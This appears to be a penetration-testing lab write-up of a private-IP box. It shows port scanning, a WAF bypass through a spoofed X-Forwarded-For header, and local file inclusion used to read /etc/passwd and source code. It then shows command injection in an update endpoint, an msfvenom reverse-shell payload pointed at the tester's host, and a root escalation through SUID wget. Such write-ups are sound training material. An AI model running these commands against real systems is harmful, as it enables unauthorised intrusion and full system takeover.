> Noamro08 - 7 Feb 2024

### Target - 192.168.203.134

----
nmap scan top 1000 ports services and default scripts:
```bash
nmap -Pn -n -sVC 192.168.203.134 -oN inital.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 13:09 IST
Nmap scan report for 192.168.203.134
Host is up (0.083s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

nmap scan for all ports:
```bash
nmap -Pn -n -p- 192.168.203.134 -oN all.ports
```
we get port 13337 but without service recognition

scan default scripts and service for this specific port 13337:
```bash
nmap -Pn -n -sVC 192.168.203.134 -p 13337       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 13:25 IST
Nmap scan report for 192.168.203.134
Host is up (0.085s latency).

PORT      STATE SERVICE VERSION
13337/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API

```

https site for management API:
![[Pasted image 20240207134554.png]]

GET /version:
1.0.0b8f887f33975ead915f336f57f0657180
![[Pasted image 20240207134645.png]]

```
/update

Methods: POST

Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

```
this one is very interesting because maybe we could get the server to download malicious file from our http.server, 
trying to do this we need valid username.

GET /logs:
maybe we can get logs of valid user from here but we get an error: 
'WAF: Access Denied for this Host.'

so we try to search bypasses for this specific error, and we find this article "https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c"

Due to this article we can add the header "X-Forwarded-For: 127.0.0.1" to trick the WAF thinking this request is from localhost:
![[Pasted image 20240207135131.png]]
we get an error to no file mentioned.... i smell LFI here for sure!
![[Pasted image 20240207135217.png]]
and it works we disclosed **/etc/passwd** and we now have valid username for our next attack.
user is: **clumsyadmin**

created shell.elf with msfvenom:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=80 -f elf > shell.elf
```

and open http.server:
```bash
python3 -m http.server 8081
```

![[Pasted image 20240207135626.png]]
it worked, now we just need to open nc listener and restart the server.

in the site we can see we can GET /restart, so this solve our problem...
still it does not working the restart not executing our shell.

so i try to enumerate more with the LFI we found on "/logs?file=",
so we know from the nmap it is API written in python lets try search "main.py"
![[Pasted image 20240207141125.png]]
it works and we can see that the command that that update the server and download the file we sent is executed with the function 'os.system' which maybe we can do a command injection here:
![[Pasted image 20240207141450.png]]
it works, so now lets get rev shell:
![[Pasted image 20240207142255.png]]
got it! 

now improve our shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

CTRL Z
---
stty size                            
42 189

stty raw -echo; fg
---
stty rows 42 columns 189
```

getting linpeas.sh to the target, we see that there is suid bit on 'wget' command:
![[Pasted image 20240207144411.png]]

According to this article from [gtfobins](https://gtfobins.github.io/gtfobins/wget/#suid) we can use this commands to get the root:
```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
```

![[Pasted image 20240207144816.png]]
